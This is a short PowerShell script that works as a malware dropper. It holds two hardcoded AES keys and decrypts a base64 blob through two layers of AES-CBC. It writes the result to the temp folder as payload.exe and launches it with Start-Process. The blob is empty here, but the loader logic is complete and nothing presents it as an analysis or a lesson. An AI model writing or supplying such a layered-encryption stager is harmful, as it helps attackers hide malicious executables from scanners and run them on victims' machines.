$RandomKey = [Convert]::FromBase64String("t6nFy3HYx5wjCfjQjYFEqnUXS9oj1qnaxiyBCStHtz8=")
$MasterKey = [Convert]::FromBase64String("36uHzmzhZ7uTamle9K3UuEyNt9SEX5cYHHYqzL0UxC0=")
$DataB64 = ""

function AES_Decrypt([byte[]]$key, [byte[]]$data) {
    $iv = $data[0..15]
    $cipher = New-Object System.Security.Cryptography.AesManaged
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $cipher.KeySize = 256
    $cipher.Key = $key
    $decryptor = $cipher.CreateDecryptor($cipher.Key, $iv)
    $encryptedBytes = $data[16..($data.Length-1)]
    $decrypted = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    return $decrypted
}

$EncryptedBytes = [Convert]::FromBase64String($DataB64)

# Decrypt with master key
$DecryptedLayer2 = AES_Decrypt $MasterKey $EncryptedBytes

# Decrypt with random key
$DecryptedLayer1 = AES_Decrypt $RandomKey $DecryptedLayer2

$TempPath = "$env:TEMP\payload.exe"
[IO.File]::WriteAllBytes($TempPath, $DecryptedLayer1)
Start-Process $TempPath
